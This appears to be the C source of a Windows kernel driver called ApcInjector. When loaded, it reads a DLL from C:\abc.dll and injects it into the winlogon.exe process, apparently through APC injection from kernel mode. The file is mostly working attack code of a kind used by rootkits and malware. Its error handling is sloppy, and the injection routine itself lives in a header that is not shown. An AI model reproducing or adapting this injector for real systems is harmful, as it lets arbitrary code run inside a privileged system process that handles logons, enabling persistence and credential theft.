#include "stdafx.h"
#include "dll_inject.h"
/*
	ApcInjector - Main file
	This file contains a very simple implementation of a WDM driver. Note that it does not support all
	WDM functionality, or any functionality sufficient for practical use. The only thing this driver does
	perfectly, is loading and unloading.

	To install the driver, go to Control Panel -> Add Hardware Wizard, then select "Add a new hardware device".
	Select "manually select from list", choose device category, press "Have Disk" and enter the path to your
	INF file.
	Note that not all device types (specified as Class in INF file) can be installed that way.

	To start/stop this driver, use Windows Device Manager (enable/disable device command).

	If you want to speed up your driver development, it is recommended to see the BazisLib library, that
	contains convenient classes for standard device types, as well as a more powerful version of the driver
	wizard. To get information about BazisLib, see its website:
		http://bazislib.sysprogs.org/
*/

void ApcInjectorUnload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS ApcInjectorCreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS ApcInjectorDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

void ApcInjectDll(){

	HANDLE hFile;
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatusBlock;

	LARGE_INTEGER FileSize;
	FILE_STANDARD_INFORMATION FileInfo ;
	
	UCHAR *FileBuffer;
	int Length;
	UNICODE_STRING unicodeFileName = RTL_CONSTANT_STRING(L"\\??\\C:\\abc.dll");

	InitializeObjectAttributes(&ObjectAttributes, &unicodeFileName,
		OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL);

	Status = ZwCreateFile(&hFile, GENERIC_READ|GENERIC_WRITE, &ObjectAttributes, 
		&IoStatusBlock, NULL, 
		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
		FILE_OPEN_IF,FILE_NON_DIRECTORY_FILE|FILE_RANDOM_ACCESS|FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, 0);

	if (!NT_SUCCESS(Status))
	{
		//fail
		DbgPrint("ZwCreateFile can't open the file");
		return ;
	}

	Status = ZwQueryInformationFile(hFile, &IoStatusBlock, &FileInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(Status))
	{
		// fail
		ZwClose(hFile);
		return ;
	}
	FileSize.HighPart = FileInfo.EndOfFile.HighPart;
	FileSize.LowPart = FileInfo.EndOfFile.LowPart;
	Length = FileSize.LowPart;
	FileBuffer = (UCHAR *)ExAllocatePool(PagedPool, Length);
	if (FileBuffer == NULL)
	{
		
		ZwClose(hFile);
	}

	Status = ZwReadFile(hFile, NULL, NULL, NULL, &IoStatusBlock,
		FileBuffer, Length, 0, NULL);
	if (!NT_SUCCESS(Status))
	{
		ExFreePool(FileBuffer);
		ZwClose(hFile);
	}

	InjectIntoProcessByName(L"winlogon.exe", FileBuffer, Length);


}

#ifdef __cplusplus
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	unsigned i;

	DbgPrint("Hello from ApcInjector!\n");

	DriverObject->MajorFunction[IRP_MJ_CREATE] = ApcInjectorCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = ApcInjectorCreateClose;

	DriverObject->DriverUnload = ApcInjectorUnload;
	__asm int 3;
	ApcInjectDll();


	return STATUS_SUCCESS;
}

void ApcInjectorUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("Goodbye from ApcInjector!\n");
}


NTSTATUS ApcInjectorCreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
